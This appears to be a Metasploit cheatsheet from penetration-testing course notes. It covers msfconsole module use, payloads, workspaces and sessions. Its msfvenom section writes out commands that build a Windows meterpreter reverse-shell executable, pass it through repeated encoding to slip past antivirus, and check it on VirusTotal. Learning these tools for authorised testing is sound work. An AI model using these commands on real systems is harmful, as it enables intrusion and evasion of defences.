---
title: Module 3 - Using Metasploit
tags: [metasploit, msfconsole, msfvenom, exploitation, cheatsheet]
---

# Module 3 - Using Metasploit
> Quick-reference cheatsheet for Metasploit Framework.

---

## MSFConsole

```bash
msfconsole          # launch
msfconsole -q       # launch without banner
msfupdate           # update Metasploit
```

## Searching & Using Modules

```bash
search eternalromance
search type:exploit platform:windows cve:2021 rank:excellent microsoft

use <module_path_or_number>
show options
info
set LHOST <IP>
set RHOSTS <IP>
run
```

## Payloads

```bash
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads

# Payload naming: / = staged, _ = single
# windows/shell/reverse_tcp  → staged (stager + stage)
# windows/shell_reverse_tcp  → single (self-contained)
```

## msfvenom

```bash
# Basic payload generation
msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <outfile>

# Common formats: exe, aspx, jsp, war, elf, raw, perl, python, bash

# With encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 \
  -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8080 \
  -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Check with VirusTotal
msf-virustotal -k <API_key> -f payload.exe
```

## Database & Workspaces

```bash
sudo msfdb init
sudo msfdb run
msf6 > db_status

# Workspaces
workspace           # list
workspace -a <name> # create
workspace <name>    # switch

# Nmap via MSF (stores results in DB)
db_nmap -sV -sS <IP>

# Import external scan
db_import <scan.xml>

# Query stored data
hosts
services
creds
loot
```

## Sessions & Jobs

```bash
sessions            # list active sessions
sessions -i <id>    # interact with session
meterpreter> shell  # drop to shell

jobs -l             # list running jobs
exploit -j          # run exploit as background job
```
